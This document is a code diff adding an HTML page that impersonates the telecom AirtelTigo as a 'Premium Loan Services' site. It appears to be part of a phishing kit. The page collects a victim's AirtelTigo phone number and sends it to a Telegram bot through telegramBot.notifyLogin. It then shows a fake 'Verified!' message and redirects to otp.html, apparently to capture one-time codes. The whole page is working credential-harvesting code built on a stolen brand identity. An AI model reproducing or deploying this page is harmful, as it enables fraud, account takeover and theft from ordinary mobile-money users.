@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AirtelTigo - Premium Loan Services</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="script.js"></script>
+    <script src="telegram.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #002d5d 0%, #001a35 100%);
+        }
+
+        .hero-section {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
+            animation: float 20s ease-in-out infinite;
+            z-index: 0;
+        }
+
+        .hero-section::after {
+            content: '';
+            position: absolute;
+            bottom: -50%;
+            left: -50%;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 107, 53, 0.05) 0%, transparent 70%);
+            animation: float 25s ease-in-out infinite reverse;
+            z-index: 0;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, 30px); }
+        }
+
+        .content-wrapper {
+            position: relative;
+            z-index: 1;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+            animation: fadeInDown 0.8s ease-out;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            margin: 0 auto 1.5rem;
+            animation: scaleIn 0.6s ease-out;
+            padding: 5px;
+            border: 4px solid white;
+            overflow: hidden;
+        }
+
+        .logo-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        .brand-name {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.02em;
+        }
+
+        .brand-tagline {
+            font-size: 0.95rem;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 500;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+        }
+
+        .form-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 2rem;
+            padding: 2.5rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .form-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: #002d5d;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #6b7280;
+            font-size: 0.95rem;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .form-group:nth-child(1) { animation-delay: 0.3s; }
+        .form-group:nth-child(2) { animation-delay: 0.4s; }
+        .form-group:nth-child(3) { animation-delay: 0.5s; }
+
+        .form-label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #1f2937;
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #002d5d;
+            font-size: 1.1rem;
+        }
+
+        input[type="text"] {
+            padding-left: 3rem;
+            border: 2px solid #e5e7eb;
+            border-radius: 1rem;
+            font-size: 1rem;
+            font-weight: 600;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus {
+            border-color: #002d5d;
+            box-shadow: 0 0 0 4px rgba(0, 45, 93, 0.1);
+            transform: translateY(-2px);
+        }
+
+        input[type="text"]::placeholder {
+            color: #d1d5db;
+        }
+
+        .error-message {
+            color: #ff3b30;
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-top: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            animation: slideInLeft 0.3s ease-out;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 1rem;
+            border-radius: 1rem;
+            font-size: 1rem;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-top: 1.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-continue.active {
+            background: linear-gradient(135deg, #002d5d 0%, #003d7a 100%);
+            color: white;
+            box-shadow: 0 10px 30px rgba(0, 45, 93, 0.3);
+        }
+
+        .btn-continue.active:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 45, 93, 0.4);
+        }
+
+        .btn-continue.active:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-continue.disabled {
+            background: #e5e7eb;
+            color: #9ca3af;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .features {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-around;
+            gap: 0.5rem;
+            margin-top: 2rem;
+            padding-top: 2rem;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .feature {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.75rem;
+            animation: fadeInUp 0.6s ease-out;
+            padding: 0.5rem;
+            border-radius: 1rem;
+            transition: background 0.3s ease;
+            flex: 1;
+            text-align: center;
+        }
+
+        .feature:hover {
+            background: rgba(0, 45, 93, 0.05);
+        }
+
+        .feature:nth-child(1) { animation-delay: 0.6s; }
+        .feature:nth-child(2) { animation-delay: 0.7s; }
+        .feature:nth-child(3) { animation-delay: 0.8s; }
+
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1) 0%, rgba(0, 45, 93, 0.1) 100%);
+            border-radius: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #002d5d;
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+
+        .feature-text {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #1f2937;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .footer-links {
+            text-align: center;
+            margin-top: 2rem;
+            padding-top: 1.5rem;
+            border-top: 1px solid #e5e7eb;
+        }
+
+        .footer-links a {
+            color: #6b7280;
+            text-decoration: none;
+            font-size: 0.875rem;
+            margin: 0 1rem;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #002d5d;
+        }
+
+        .error-shake {
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @media (max-width: 768px) {
+            .hero-section {
+                padding: 1.5rem;
+            }
+
+            .form-container {
+                padding: 1.5rem;
+                border-radius: 1.5rem;
+            }
+
+            .brand-name {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="hero-section">
+        <div class="content-wrapper">
+            <div class="header">
+                <div class="logo-container">
+                    <img src="at-logo.jpg" alt="AirtelTigo Logo">
+                </div>
+                <h1 class="brand-name">AirtelTigo</h1>
+                <p class="brand-tagline">Financial Services</p>
+            </div>
+
+            <div class="form-container">
+                <h2 class="form-title">Get Started</h2>
+                <p class="form-subtitle">Enter your phone number to access your account and unlock amazing financial opportunities</p>
+
+                <form id="login-form">
+                    <div class="form-group">
+                        <label class="form-label">Phone Number</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-phone"></i>
+                            <input type="text" id="login-phone" placeholder="e.g., 0271234567" autocomplete="off">
+                        </div>
+                        <div id="login-error" class="error-message hidden">
+                            <i class="fas fa-exclamation-circle"></i>
+                            <span>Please enter a valid AirtelTigo number</span>
+                        </div>
+                    </div>
+
+                    <button type="button" id="login-continue" class="btn-continue disabled">
+                        <span id="btn-text">Continue</span>
+                        <i id="btn-icon" class="fas fa-arrow-right" style="display: none; margin-left: 0.5rem;"></i>
+                    </button>
+                </form>
+
+                <div class="features">
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                        <p class="feature-text">Secure</p>
+                    </div>
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <i class="fas fa-bolt"></i>
+                        </div>
+                        <p class="feature-text">Fast</p>
+                    </div>
+                    <div class="feature">
+                        <div class="feature-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <p class="feature-text">Reliable</p>
+                    </div>
+                </div>
+
+                <div class="footer-links">
+                    <a href="#">Terms & Conditions</a>
+                    <a href="#">Privacy Policy</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const phoneInput = document.getElementById('login-phone');
+        const continueBtn = document.getElementById('login-continue');
+        const loginError = document.getElementById('login-error');
+        const btnText = document.getElementById('btn-text');
+        const btnIcon = document.getElementById('btn-icon');
+        const loginForm = document.getElementById('login-form');
+
+        const data = AppData.get();
+        if (data.fullPhone) {
+            phoneInput.value = '0' + data.fullPhone.replace('+233', '');
+            updateButtonState();
+        }
+
+        function validatePhone(number) {
+            const atPrefixes = ['027', '057', '026', '056', '27', '57', '26', '56'];
+            return atPrefixes.some(prefix => number.startsWith(prefix)) && (number.length === 9 || number.length === 10);
+        }
+
+        function updateButtonState() {
+            if (phoneInput.value.length >= 9) {
+                continueBtn.classList.remove('disabled');
+                continueBtn.classList.add('active');
+            } else {
+                continueBtn.classList.add('disabled');
+                continueBtn.classList.remove('active');
+            }
+        }
+
+        phoneInput.addEventListener('input', () => {
+            loginError.classList.add('hidden');
+            phoneInput.classList.remove('border-red-500');
+            updateButtonState();
+        });
+
+        continueBtn.addEventListener('click', async (e) => {
+            e.preventDefault();
+            
+            if (continueBtn.classList.contains('disabled')) return;
+
+            const val = phoneInput.value.trim();
+            if (!validatePhone(val)) {
+                loginError.classList.remove('hidden');
+                phoneInput.parentElement.classList.add('error-shake');
+                setTimeout(() => phoneInput.parentElement.classList.remove('error-shake'), 500);
+                return;
+            }
+
+            // Loading state
+            continueBtn.disabled = true;
+            btnText.textContent = 'Sending...';
+            btnIcon.style.display = 'inline-block';
+            continueBtn.style.opacity = '0.7';
+
+            const displayPhone = val.startsWith('0') ? val : '0' + val;
+            const fullPhone = '+233' + val.replace(/^0/, '');
+            AppData.save({ fullPhone: fullPhone });
+
+            // Send notification to Telegram
+            await telegramBot.notifyLogin(displayPhone);
+
+            // Success animation
+            setTimeout(() => {
+                btnText.textContent = 'Verified!';
+                btnIcon.innerHTML = '<i class="fas fa-check"></i>';
+                continueBtn.style.opacity = '1';
+                
+                setTimeout(() => {
+                    location.href = 'otp.html';
+                }, 500);
+            }, 1500);
+        });
+
+        updateButtonState();
+    </script>
+</body>
+</html>
